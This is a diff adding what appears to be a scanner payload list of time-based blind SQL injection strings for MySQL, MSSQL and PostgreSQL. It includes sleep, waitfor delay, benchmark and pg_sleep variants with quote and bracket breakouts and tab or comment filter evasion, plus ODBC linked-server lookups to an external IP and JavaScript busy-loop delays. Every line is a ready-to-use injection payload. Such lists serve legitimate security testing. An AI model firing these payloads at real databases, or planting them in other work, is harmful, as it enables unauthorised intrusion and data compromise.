@@ -1,0 +1,218 @@
+sleep([TIME])#1
+sleep([TIME])#[LF]1
+[VALUE],sleep([TIME])#1
+[VALUE]`,sleep([TIME])#1
+1 or sleep([TIME])#1
+1 or sleep([TIME])#[LF]1
+" or sleep([TIME])#1
+" or sleep([TIME])#[LF]1
+' or sleep([TIME])#1
+' or sleep([TIME])#[LF]1
+" or sleep([TIME])="
+' or sleep([TIME])='
+1) or sleep([TIME])#1
+1) or sleep([TIME])#[LF]1
+") or sleep([TIME])="
+') or sleep([TIME])='
+1)) or sleep([TIME])#1
+1)) or sleep([TIME])#[LF]1
+")) or sleep([TIME])="
+')) or sleep([TIME])='
+1 and sleep([TIME])#1
+1 and sleep([TIME])#[LF]1
+" and sleep([TIME])#1
+" and sleep([TIME])#[LF]1
+' and sleep([TIME])#1
+' and sleep([TIME])#[LF]1
+" and sleep([TIME])="
+' and sleep([TIME])='
+1) and sleep([TIME])#1
+1) and sleep([TIME])#[LF]1
+") and sleep([TIME])="
+') and sleep([TIME])='
+1)) and sleep([TIME])#1
+1)) and sleep([TIME])#[LF]1
+")) and sleep([TIME])="
+')) and sleep([TIME])='
+;waitfor delay '0:0:[TIME]'--1
+[VALUE];waitfor delay '0:0:[TIME]'--1
+[VALUE] waitfor delay '0:0:[TIME]'--1
+;waitfor delay '0:0:[TIME]'--[LF]1
+);waitfor delay '0:0:[TIME]'--1
+[VALUE]);waitfor delay '0:0:[TIME]'--1
+);waitfor delay '0:0:[TIME]'--[LF]1
+';waitfor delay '0:0:[TIME]'--1
+';waitfor delay '0:0:[TIME]'--[LF]1
+";waitfor delay '0:0:[TIME]'--1
+";waitfor delay '0:0:[TIME]'--[LF]1
+');waitfor delay '0:0:[TIME]'--1
+');waitfor delay '0:0:[TIME]'--[LF]1
+");waitfor delay '0:0:[TIME]'--1
+");waitfor delay '0:0:[TIME]'--[LF]1
+));waitfor delay '0:0:[TIME]'--1
+[VALUE]));waitfor delay '0:0:[TIME]'--1
+));waitfor delay '0:0:[TIME]'--[LF]1
+'));waitfor delay '0:0:[TIME]'--1
+'));waitfor delay '0:0:[TIME]'--[LF]1
+"));waitfor delay '0:0:[TIME]'--1
+"));waitfor delay '0:0:[TIME]'--[LF]1
+benchmark(10000000,MD5(1))#1
+1 or benchmark(10000000,MD5(1))#1
+" or benchmark(10000000,MD5(1))#1
+' or benchmark(10000000,MD5(1))#1
+1) or benchmark(10000000,MD5(1))#1
+") or benchmark(10000000,MD5(1))#1
+') or benchmark(10000000,MD5(1))#1
+1)) or benchmark(10000000,MD5(1))#1
+")) or benchmark(10000000,MD5(1))#1
+')) or benchmark(10000000,MD5(1))#1
+pg_sleep([TIME])--1
+pg_sleep([TIME])--[LF]1
+1 or pg_sleep([TIME])--1
+1 or pg_sleep([TIME])--[LF]1
+" or pg_sleep([TIME])--1
+" or pg_sleep([TIME])--[LF]1
+' or pg_sleep([TIME])--1
+' or pg_sleep([TIME])--[LF]1
+1) or pg_sleep([TIME])--1
+1) or pg_sleep([TIME])--[LF]1
+") or pg_sleep([TIME])--1
+") or pg_sleep([TIME])--[LF]1
+') or pg_sleep([TIME])--1
+') or pg_sleep([TIME])--[LF]1
+1)) or pg_sleep([TIME])--1
+")) or pg_sleep([TIME])--1
+')) or pg_sleep([TIME])--1
+1 and pg_sleep([TIME])--1
+" and pg_sleep([TIME])--1
+' and pg_sleep([TIME])--1
+1) and pg_sleep([TIME])--1
+") and pg_sleep([TIME])--1
+') and pg_sleep([TIME])--1
+1)) and pg_sleep([TIME])--1
+")) and pg_sleep([TIME])--1
+')) and pg_sleep([TIME])--1
+1[TAB]or[TAB]sleep([TIME])#1
+"[TAB]or[TAB]sleep([TIME])#1
+'[TAB]or[TAB]sleep([TIME])#1
+"[TAB]or[TAB]sleep([TIME])="
+'[TAB]or[TAB]sleep([TIME])='
+1)[TAB]or[TAB]sleep([TIME])#1
+")[TAB]or[TAB]sleep([TIME])="
+')[TAB]or[TAB]sleep([TIME])='
+1))[TAB]or[TAB]sleep([TIME])#1
+"))[TAB]or[TAB]sleep([TIME])="
+'))[TAB]or[TAB]sleep([TIME])='
+1[TAB]and[TAB]sleep([TIME])#1
+"[TAB]and[TAB]sleep([TIME])#1
+'[TAB]and[TAB]sleep([TIME])#1
+"[TAB]and[TAB]sleep([TIME])="
+'[TAB]and[TAB]sleep([TIME])='
+1)[TAB]and[TAB]sleep([TIME])#1
+")[TAB]and[TAB]sleep([TIME])="
+')[TAB]and[TAB]sleep([TIME])='
+1))[TAB]and[TAB]sleep([TIME])#1
+"))[TAB]and[TAB]sleep([TIME])="
+'))[TAB]and[TAB]sleep([TIME])='
+;waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+);waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+';waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+";waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+');waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+");waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+));waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+'));waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+"));waitfor[TAB]delay[TAB]'0:0:[TIME]'--1
+1[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+"[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+'[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+1)[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+")[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+')[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+1))[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+"))[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+'))[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+1[TAB]or[TAB]pg_sleep([TIME])--1
+"[TAB]or[TAB]pg_sleep([TIME])--1
+'[TAB]or[TAB]pg_sleep([TIME])--1
+1)[TAB]or[TAB]pg_sleep([TIME])--1
+")[TAB]or[TAB]pg_sleep([TIME])--1
+')[TAB]or[TAB]pg_sleep([TIME])--1
+1))[TAB]or[TAB]pg_sleep([TIME])--1
+"))[TAB]or[TAB]pg_sleep([TIME])--1
+'))[TAB]or[TAB]pg_sleep([TIME])--1
+1[TAB]and[TAB]pg_sleep([TIME])--1
+"[TAB]and[TAB]pg_sleep([TIME])--1
+'[TAB]and[TAB]pg_sleep([TIME])--1
+1)[TAB]and[TAB]pg_sleep([TIME])--1
+")[TAB]and[TAB]pg_sleep([TIME])--1
+')[TAB]and[TAB]pg_sleep([TIME])--1
+1))[TAB]and[TAB]pg_sleep([TIME])--1
+"))[TAB]and[TAB]pg_sleep([TIME])--1
+'))[TAB]and[TAB]pg_sleep([TIME])--1
+1/**/or/**/sleep([TIME])#1
+"/**/or/**/sleep([TIME])#1
+'/**/or/**/sleep([TIME])#1
+"/**/or/**/sleep([TIME])="
+'/**/or/**/sleep([TIME])='
+1)/**/or/**/sleep([TIME])#1
+")/**/or/**/sleep([TIME])="
+')/**/or/**/sleep([TIME])='
+1))/**/or/**/sleep([TIME])#1
+"))/**/or/**/sleep([TIME])="
+'))/**/or/**/sleep([TIME])='
+1/**/and/**/sleep([TIME])#1
+"/**/and/**/sleep([TIME])#1
+'/**/and/**/sleep([TIME])#1
+"/**/and/**/sleep([TIME])="
+'/**/and/**/sleep([TIME])='
+1)/**/and/**/sleep([TIME])#1
+")/**/and/**/sleep([TIME])="
+')/**/and/**/sleep([TIME])='
+1))/**/and/**/sleep([TIME])#1
+"))/**/and/**/sleep([TIME])="
+'))/**/and/**/sleep([TIME])='
+;waitfor/**/delay/**/'0:0:[TIME]'--1
+);waitfor/**/delay/**/'0:0:[TIME]'--1
+';waitfor/**/delay/**/'0:0:[TIME]'--1
+";waitfor/**/delay/**/'0:0:[TIME]'--1
+');waitfor/**/delay/**/'0:0:[TIME]'--1
+");waitfor/**/delay/**/'0:0:[TIME]'--1
+));waitfor/**/delay/**/'0:0:[TIME]'--1
+'));waitfor/**/delay/**/'0:0:[TIME]'--1
+"));waitfor/**/delay/**/'0:0:[TIME]'--1
+1/**/or/**/benchmark(10000000,MD5(1))#1
+"/**/or/**/benchmark(10000000,MD5(1))#1
+'/**/or/**/benchmark(10000000,MD5(1))#1
+1)/**/or/**/benchmark(10000000,MD5(1))#1
+")/**/or/**/benchmark(10000000,MD5(1))#1
+')/**/or/**/benchmark(10000000,MD5(1))#1
+1))/**/or/**/benchmark(10000000,MD5(1))#1
+"))/**/or/**/benchmark(10000000,MD5(1))#1
+'))/**/or/**/benchmark(10000000,MD5(1))#1
+1/**/or/**/pg_sleep([TIME])--1
+"/**/or/**/pg_sleep([TIME])--1
+'/**/or/**/pg_sleep([TIME])--1
+1)/**/or/**/pg_sleep([TIME])--1
+")/**/or/**/pg_sleep([TIME])--1
+')/**/or/**/pg_sleep([TIME])--1
+1))/**/or/**/pg_sleep([TIME])--1
+"))/**/or/**/pg_sleep([TIME])--1
+'))/**/or/**/pg_sleep([TIME])--1
+1/**/and/**/pg_sleep([TIME])--1
+"/**/and/**/pg_sleep([TIME])--1
+'/**/and/**/pg_sleep([TIME])--1
+1)/**/and/**/pg_sleep([TIME])--1
+")/**/and/**/pg_sleep([TIME])--1
+')/**/and/**/pg_sleep([TIME])--1
+1))/**/and/**/pg_sleep([TIME])--1
+"))/**/and/**/pg_sleep([TIME])--1
+'))/**/and/**/pg_sleep([TIME])--1
+' and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+" and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+') and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+") and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+')) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+")) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+';d=new Date();do{cd=new Date();}while(cd-d<10000);//
+";d=new Date();do{cd=new Date();}while(cd-d<10000);//
